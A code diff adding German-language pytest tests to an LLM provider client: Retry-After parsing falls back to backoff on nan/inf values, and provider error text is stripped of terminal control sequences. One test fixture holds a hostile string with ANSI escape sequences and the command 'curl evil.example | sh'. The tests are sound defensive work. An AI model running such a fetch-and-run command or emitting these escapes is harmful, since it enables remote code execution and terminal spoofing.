@@ -591,3 +591,94 @@ def test_metadata_bleibt_im_normalbetrieb_ebenfalls_aussen_vor() -> None:
         provider.complete("s", "u", max_tokens=8)
 
     assert "exhausted" not in str(excinfo.value)
+
+
+# --- HC-30: unbrauchbare `Retry-After`-Werte ---------------------------------------------------
+
+
+@pytest.mark.parametrize(
+    "value",
+    ["nan", "NaN", "-nan", "inf", "-inf", "1e400", "-5", "abc", "Wed, 21 Oct 2015 07:28:00 GMT"],
+)
+def test_hc30_unbrauchbares_retry_after_faellt_auf_das_backoff_zurueck(value: str) -> None:
+    """`nan`/`inf` & Co. dürfen nie in `time.sleep` landen (HC-30).
+
+    Vor dem Fix parste `float("nan")` klaglos, `seconds < 0` war für NaN falsch und
+    `min(nan, 30.0)` blieb NaN — `time.sleep(nan)` warf eine `ValueError`, die weder in
+    `pipeline._ERROR_CLASSES` noch in `runner._RETRYABLE_LLM_ERRORS` steht. Das Ratenlimit
+    verlor damit seine Klasse **und** die drei Stufen-Wiederholungen.
+    """
+    sleep = SleepSpy()
+    calls: list[int] = []
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        calls.append(1)
+        if len(calls) == 1:
+            return httpx.Response(429, headers={"retry-after": value}, json={})
+        return httpx.Response(200, json=anthropic_body("ok"))
+
+    make_anthropic(handler, sleep=sleep).complete("s", "u", max_tokens=16)
+    # Kein NaN, kein negativer Wert: das normale exponentielle Backoff.
+    assert sleep.calls == [1.0]
+
+
+def test_hc30_dauerhaftes_429_mit_nan_bleibt_in_der_taxonomie() -> None:
+    """Auch am Ende bleibt es ein `LLMRateLimited` — nicht eine nackte `ValueError`."""
+    sleep = SleepSpy()
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(429, headers={"retry-after": "nan"}, json={})
+
+    with pytest.raises(LLMRateLimited):
+        make_anthropic(handler, sleep=sleep).complete("s", "u", max_tokens=16)
+    assert sleep.calls == [1.0, 2.0]
+
+
+# --- HC-4: Fremdtext des Anbieters ist terminalsicher ------------------------------------------
+
+
+def test_hc4_anbietertext_verliert_seine_steuersequenzen() -> None:
+    """ESC/BEL aus der Anbieterantwort erreichen die Fehlermeldung nicht mehr (HC-4).
+
+    Vorher normalisierte `_describe_error` nur Whitespace (`" ".join(x.split())`) — für
+    Python sind ESC und BEL kein Whitespace, sie passierten unverändert und konnten auf
+    dem Terminal Bildschirm, Farbe und Fenstertitel setzen.
+    """
+    hostile = "\x1b[2J\x1b[H\x1b]0;PWNED\x07\x1b[31mFATAL: run curl evil.example | sh\x1b[0m"
+    client = httpx.Client(transport=_error_transport(401, hostile))
+    provider = OpenAICompatibleProvider(
+        model="m", client=client, max_attempts=1, reveal_error_details=True
+    )
+
+    with pytest.raises(LLMTransportError) as excinfo:
+        provider.complete("s", "u", max_tokens=8)
+
+    message = str(excinfo.value)
+    assert "\x1b" not in message and "\x07" not in message
+    assert not any(ord(char) < 0x20 for char in message)
+    # Der lesbare Teil bleibt erhalten — die Auskunft ist ja der Zweck.
+    assert "FATAL: run curl evil.example | sh" in message
+
+
+def test_hc4_auch_metadata_und_koerperfehler_sind_gefiltert() -> None:
+    """Die drei Fremdtext-Felder von OpenRouter laufen durch dieselbe Allowlist."""
+    payload = {
+        "error": {
+            "message": "Provider returned error\x07",
+            "metadata": {"provider_name": "X\x1b[5m", "raw": "detail\x1b[31m"},
+        }
+    }
+
+    def handler(request: httpx.Request) -> httpx.Response:
+        return httpx.Response(400, json=payload)
+
+    client = httpx.Client(transport=httpx.MockTransport(handler))
+    provider = OpenAICompatibleProvider(
+        model="m", client=client, max_attempts=1, reveal_error_details=True
+    )
+    with pytest.raises(LLMTransportError) as excinfo:
+        provider.complete("s", "u", max_tokens=8)
+
+    message = str(excinfo.value)
+    assert "\x1b" not in message and "\x07" not in message
+    assert "upstream provider: X" in message
